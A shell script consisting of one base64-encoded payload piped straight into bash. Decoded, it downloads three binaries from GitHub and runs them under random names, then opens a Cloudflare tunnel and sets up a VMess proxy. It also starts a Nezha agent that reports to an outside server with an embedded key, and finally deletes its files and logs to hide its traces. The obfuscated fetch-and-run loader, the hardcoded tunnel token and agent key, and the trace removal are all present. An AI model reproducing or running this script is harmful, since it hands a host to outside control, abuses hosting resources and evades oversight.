#!/usr/bin/env sh

echo "Z2VuZXJhdGVfcmFuZG9tX25hbWUoKSB7CiAgICBsb2NhbCBsZW5ndGg9JDEKICAgIG9wZW5zc2wgcmFuZCAtYmFzZTY0IDQ4IHwgdHIgLWRjICdhLXowLTknIHwgaGVhZCAtYyAiJGxlbmd0aCIKfQoKZXhwb3J0IE5FWkhBX1NFUlZFUj0ibmV6aGEubWluZ2ZlaTE5ODEuZXUub3JnOjQ0MyIKZXhwb3J0IE5FWkhBX0tFWT0iSEtHN3lHbUZGd1EwNVpCOE9YIgpleHBvcnQgVVVJRD0ke1VVSUQ6LSdmYWFjZjE0Mi1kZWU4LTQ4YzItODU1OC02NDExMjNlYjkzOWMnfQpleHBvcnQgQVJHT19ET01BSU49JHtBUkdPX0RPTUFJTjotJ2tpbmdzbmV0d29ya2JlLjUuZC4wLjAuOS4yLmYuMS4wLjcuNC4wLjEuMC4wLjIuaXA2LmFycGEnfQpleHBvcnQgQVJHT19BVVRIPSR7QVJHT19BVVRIOi0nZXlKaElqb2lOamd5TldJNFlUWmpPREJoWVdReE9EbG1ZV0k1WldFd01ESTVZelkyTmpnaUxDSjBJam9pTXpFMlpUZzFOemt0TlRoa1lTMDBNamMzTFRobFpqRXRaR1E1TkRGak9HWmhaRGhpSWl3aWN5STZJazlVV1hsT1Yxa3pUbXBOZEU1RVVtcFpVekF3V1ZSYWEweFViRzFhYW10MFQxUm9iRmxYVG10YWJWWnFUMFJvYkNKOSd9CmV4cG9ydCBDRklQPSR7Q0ZJUDotJ3Nray5tb2UnfQpleHBvcnQgQ0ZQT1JUPSR7Q0ZQT1JUOi0nNDQzJ30gCmV4cG9ydCBOQU1FPSR7TkFNRTotJ01KSid9ICAKZXhwb3J0IEFSR09fUE9SVD0ke0FSR09fUE9SVDotJzI1OTU2J30KClJBTkRPTV9XRUJfTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpClJBTkRPTV9OUE1fTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpClJBTkRPTV9CT1RfTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lIDgpCgpkb3dubG9hZF9maWxlKCkgewogICAgdXJsPSQxCiAgICBvdXRwdXQ9JDIKICAgIGN1cmwgLXNMICIkdXJsIiAtbyAiJG91dHB1dCIKICAgIGlmIFsgJD8gLW5lIDAgXTsgdGhlbgogICAgICAgIGVjaG8gIkZhaWxlZCB0byBkb3dubG9hZCAkb3V0cHV0LCBwbGVhc2UgY2hlY2sgdGhlIG5ldHdvcmsgY29ubmVjdGlvbiBhbmQgZG93bmxvYWQgbGluay4iCiAgICAgICAgZXhpdCAxCiAgICBmaQp9CgpBUkNIPSQodW5hbWUgLW0pCmlmIFsgIiRBUkNIIiA9PSAiYXJtIiBdIHx8IFsgIiRBUkNIIiA9PSAiYXJtNjQiIF0gfHwgWyAiJEFSQ0giID09ICJhYXJjaDY0IiBdOyB0aGVuCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hcm1zYiIgIiRSQU5ET01fV0VCX05BTUUiCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hcm02NGFnZW50IiAiJFJBTkRPTV9OUE1fTkFNRSIKICAgIGRvd25sb2FkX2ZpbGUgImh0dHBzOi8vZ2l0aHViLmNvbS9iYWJhbWExMDAxOTgwL2dvb2QvcmVsZWFzZXMvZG93bmxvYWQvbnBjL2FybTY0MmdvIiAiJFJBTkRPTV9CT1RfTkFNRSIKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hbWRzYiIgIiRSQU5ET01fV0VCX05BTUUiCiAgICBkb3dubG9hZF9maWxlICJodHRwczovL2dpdGh1Yi5jb20vYmFiYW1hMTAwMTk4MC9nb29kL3JlbGVhc2VzL2Rvd25sb2FkL25wYy9hbWQ2NGFnZW50IiAiJFJBTkRPTV9OUE1fTkFNRSIKICAgIGRvd25sb2FkX2ZpbGUgImh0dHBzOi8vZ2l0aHViLmNvbS9iYWJhbWExMDAxOTgwL2dvb2QvcmVsZWFzZXMvZG93bmxvYWQvbnBjL2FtZDY0MmdvIiAiJFJBTkRPTV9CT1RfTkFNRSIKZWxzZQogICAgZWNobyAiVW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiAkQVJDSCIKICAgIGV4aXQgMQpmaQoKY2htb2QgK3ggIiRSQU5ET01fV0VCX05BTUUiICIkUkFORE9NX05QTV9OQU1FIiAiJFJBTkRPTV9CT1RfTkFNRSIKCnsKICAgIG9wZW5zc2wgZWNwYXJhbSAtZ2Vua2V5IC1uYW1lIHByaW1lMjU2djEgLW91dCAicHJpdmF0ZS5rZXkiCiAgICBvcGVuc3NsIHJlcSAtbmV3IC14NTA5IC1kYXlzIDM2NTAwIC1rZXkgInByaXZhdGUua2V5IiAtb3V0ICJjZXJ0LnBlbSIgLXN1YmogIi9DTj1iaW5nLmNvbSIKfSA+IC9kZXYvbnVsbCAyPiYxCgphcmdvX2NvbmZpZ3VyZSgpIHsKICBpZiBbWyAteiAkQVJHT19BVVRIIHx8IC16ICRBUkdPX0RPTUFJTiBdXTsgdGhlbgogICAgcmV0dXJuCiAgZmkKCiAgaWYgW1sgJEFSR09fQVVUSCA9fiBUdW5uZWxTZWNyZXQgXV07IHRoZW4KICAgIGVjaG8gJEFSR09fQVVUSCA+IHR1bm5lbC5qc29uCiAgICBjYXQgPiB0dW5uZWwueW1sIDw8IEVPRgp0dW5uZWw6ICQoY3V0IC1kXCIgLWYxMiA8PDwgIiRBUkdPX0FVVEgiKQpjcmVkZW50aWFscy1maWxlOiB0dW5uZWwuanNvbgpwcm90b2NvbDogaHR0cDIKCmluZ3Jlc3M6CiAgLSBob3N0bmFtZTogJEFSR09fRE9NQUlOCiAgICBzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQKICAgIG9yaWdpblJlcXVlc3Q6CiAgICAgIG5vVExTVmVyaWZ5OiB0cnVlCiAgLSBzZXJ2aWNlOiBodHRwX3N0YXR1czo0MDQKRU9GCiAgZmkKfQphcmdvX2NvbmZpZ3VyZQoKY2F0ID4gY29uZmlnLmpzb24gPDxFT0wKewogICJpbmJvdW5kcyI6IFsKICAgIHsKICAgICAgInRhZyI6ICJ2bWVzcy13cy1pbiIsCiAgICAgICJ0eXBlIjogInZtZXNzIiwKICAgICAgImxpc3RlbiI6ICI6OiIsCiAgICAgICJsaXN0ZW5fcG9ydCI6ICR7QVJHT19QT1JUfSwKICAgICAgInVzZXJzIjogWwogICAgICAgIHsKICAgICAgICAgICJ1dWlkIjogIiR7VVVJRH0iCiAgICAgICAgfQogICAgICBdLAogICAgICAidHJhbnNwb3J0IjogewogICAgICAgICJ0eXBlIjogIndzIiwKICAgICAgICAicGF0aCI6ICIvdm1lc3MtYXJnbyIsCiAgICAgICAgImVhcmx5X2RhdGFfaGVhZGVyX25hbWUiOiAiU2VjLVdlYlNvY2tldC1Qcm90b2NvbCIKICAgICAgfQogICAgfQogIF0sCiAgIm91dGJvdW5kcyI6IFsKICAgIHsKICAgICAgInR5cGUiOiAiZGlyZWN0IiwKICAgICAgInRhZyI6ICJkaXJlY3QiCiAgICB9CiAgXQp9CkVPTAoKLi8iJFJBTkRPTV9XRUJfTkFNRSIgcnVuIC1jIGNvbmZpZy5qc29uID4gL2Rldi9udWxsIDI+JjEgJgpub2h1cCAuLyIkUkFORE9NX05QTV9OQU1FIiAtcyAiJHtORVpIQV9TRVJWRVJ9IiAtcCAiJHtORVpIQV9LRVl9IiAtLXRscyA+IC9kZXYvbnVsbCAyPiYxICYKCmlmIFsgLWUgIiRSQU5ET01fQk9UX05BTUUiIF07IHRoZW4KICAgIGlmIFtbICRBUkdPX0FVVEggPX4gXltBLVowLTlhLXo9XXsxMjAsMjUwfSQgXV07IHRoZW4KICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgcnVuIC0tdG9rZW4gJHtBUkdPX0FVVEh9IgogICAgZWxpZiBbWyAkQVJHT19BVVRIID1+IFR1bm5lbFNlY3JldCBdXTsgdGhlbgogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyB0dW5uZWwueW1sIHJ1biIKICAgIGVsc2UKICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgLS1sb2dmaWxlIGJvb3QubG9nIC0tbG9nbGV2ZWwgaW5mbyAtLXVybCBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQiCiAgICBmaQogICAgbm9odXAgLi8iJFJBTkRPTV9CT1RfTkFNRSIgJGFyZ3MgPi9kZXYvbnVsbCAyPiYxICYKICAgIHNsZWVwIDIKZmkKCmdldF9hcmdvZG9tYWluKCkgewogIGlmIFtbIC1uICRBUkdPX0FVVEggXV07IHRoZW4KICAgIGVjaG8gIiRBUkdPX0RPTUFJTiIKICBlbHNlCiAgICBsb2NhbCByZXRyeT0wCiAgICBsb2NhbCBtYXhfcmV0cmllcz02CiAgICBsb2NhbCBhcmdvZG9tYWluPSIiCiAgICB3aGlsZSBbWyAkcmV0cnkgLWx0ICRtYXhfcmV0cmllcyBdXTsgZG8KICAgICAgKChyZXRyeSsrKSkKICAgICAgYXJnb2RvbWFpbj0kKHNlZCAtbiAnc3wuKmh0dHBzOi8vXChbXi9dKnRyeWNsb3VkZmxhcmVcLmNvbVwpLip8XDF8cCcgYm9vdC5sb2cpCiAgICAgIGlmIFtbIC1uICRhcmdvZG9tYWluIF1dOyB0aGVuCiAgICAgICAgYnJlYWsKICAgICAgZmkKICAgICAgc2xlZXAgMQogICAgZG9uZQogICAgZWNobyAiJGFyZ29kb21haW4iCiAgZmkKfQoKYXJnb2RvbWFpbj0kKGdldF9hcmdvZG9tYWluKQoKewogICAgaXB2ND0kKGN1cmwgLXMgaXB2NC5pcC5zYikKICAgIGlmIFsgLW4gIiRpcHY0IiBdOyB0aGVuCiAgICAgICAgSE9TVF9JUD0iJGlwdjQiCiAgICBlbHNlCiAgICAgICAgaXB2Nj0kKGN1cmwgLXMgLS1tYXgtdGltZSAxIGlwdjYuaXAuc2IpCiAgICAgICAgaWYgWyAtbiAiJGlwdjYiIF07IHRoZW4KICAgICAgICAgICAgSE9TVF9JUD0iJGlwdjYiCiAgICAgICAgZWxzZQogICAgICAgICAgICBlY2hvICJGYWlsZWQgdG8gYWNxdWlyZSBzZXJ2ZXIgSVAsIGV4aXRpbmcuIgogICAgICAgICAgICBleGl0IDEKICAgICAgICBmaQogICAgZmkKfSA+IC9kZXYvbnVsbCAyPiYxCgpJU1A9JChjdXJsIC1zIGh0dHBzOi8vc3BlZWQuY2xvdWRmbGFyZS5jb20vbWV0YSB8IGF3ayAtRlwiICd7cHJpbnQgJDI2Ii0iJDE4fScgfCBzZWQgLWUgJ3MvIC9fL2cnKQoKY2F0IDw8IEVPRiA+IHN1Yi50eHQKdm1lc3M6Ly8kKGVjaG8gInsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwiJHtOQU1FfS0ke0lTUH1cIiwgXCJhZGRcIjogXCIke0NGSVB9XCIsIFwicG9ydFwiOiBcIiR7Q0ZQT1JUfVwiLCBcImlkXCI6IFwiJHtVVUlEfVwiLCBcImFpZFwiOiBcIjBcIiwgXCJzY3lcIjogXCJub25lXCIsIFwibmV0XCI6IFwid3NcIiwgXCJ0eXBlXCI6IFwibm9uZVwiLCBcImhvc3RcIjogXCIke2FyZ29kb21haW59XCIsIFwicGF0aFwiOiBcIi92bWVzcy1hcmdvP2VkPTIwNDhcIiwgXCJ0bHNcIjogXCJ0bHNcIiwgXCJzbmlcIjogXCIke2FyZ29kb21haW59XCIsIFwiYWxwblwiOiBcIlwiLCBcImZwXCI6IFwiXCJ9IiB8IGJhc2U2NCAtdzApCkVPRgoKYmFzZTY0IC13MCBzdWIudHh0ID4gc3ViX2VuY29kZWQudHh0Cm12IHN1Yl9lbmNvZGVkLnR4dCBzdWIudHh0CgpybSAtcmYgIiRSQU5ET01fV0VCX05BTUUiICIkUkFORE9NX05QTV9OQU1FIiAiJFJBTkRPTV9CT1RfTkFNRSIgY29uZmlnLmpzb24gcHJpdmF0ZS5rZXkgY2VydC5wZW0gYm9vdC5sb2cgdHVubmVsLmpzb24gdHVubmVsLnltbCBzdWIudHh0Cgp0YWlsIC1mIC9kZXYvbnVsbA==" | base64 -d | bash
